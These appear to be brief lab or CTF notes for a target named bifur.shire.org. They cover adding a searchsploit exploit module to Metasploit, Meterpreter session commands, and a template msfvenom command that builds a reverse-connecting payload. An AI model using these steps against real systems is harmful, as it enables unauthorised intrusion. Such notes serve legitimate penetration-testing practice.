# Target 3: bifur.shire.org

## Adding New Modules to Metasploit

```
searchsploit -m file.rb
sudo -i
cp file.rb /root/.msf4/modules/.exploits
msfconsole
search file.rb
```

## Metasploit/Meterpreter Notes

* sessions -u \[session #] to elevate to Meterpreter
* CTRL + z to background a Metasploit session
* sessions -i \[session #] to return to a backgrounded Metasploit session
* msfvenom -p \[payload] LHOST=\[IP] LPORT=\[port] -f \[format] > \[file name]
